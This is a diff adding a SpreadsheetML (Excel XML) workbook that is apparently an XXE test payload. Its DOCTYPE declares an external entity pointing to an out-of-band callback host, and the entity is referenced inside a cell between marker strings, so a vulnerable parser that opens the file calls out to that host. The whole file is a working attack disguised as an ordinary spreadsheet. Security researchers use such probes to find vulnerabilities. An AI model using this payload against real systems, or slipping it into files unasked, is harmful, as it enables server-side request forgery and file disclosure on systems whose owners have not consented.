@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<?mso-application progid="Excel.Sheet"?>
+<!DOCTYPE Workbook [<!ENTITY msobb SYSTEM "http://spreadsheetml-xxe.d9v9uua0o7diqn5t44cgwum4gq6upixwa.oast.me/entity">]>
+<Workbook
+  xmlns="urn:schemas-microsoft-com:office:spreadsheet"
+  xmlns:o="urn:schemas-microsoft-com:office:office"
+  xmlns:x="urn:schemas-microsoft-com:office:excel"
+  xmlns:ss="urn:schemas-microsoft-com:office:spreadsheet">
+  <DocumentProperties xmlns="urn:schemas-microsoft-com:office:office">
+    <Author>MSOBB</Author>
+  </DocumentProperties>
+  <Worksheet ss:Name="MSOBB">
+    <Table>
+      <Row><Cell><Data ss:Type="String">MSOBB-XXE-BEFORE-&msobb;-MSOBB-XXE-AFTER</Data></Cell></Row>
+    </Table>
+    <WorksheetOptions xmlns="urn:schemas-microsoft-com:office:excel">
+      <Selected/>
+    </WorksheetOptions>
+  </Worksheet>
+</Workbook>
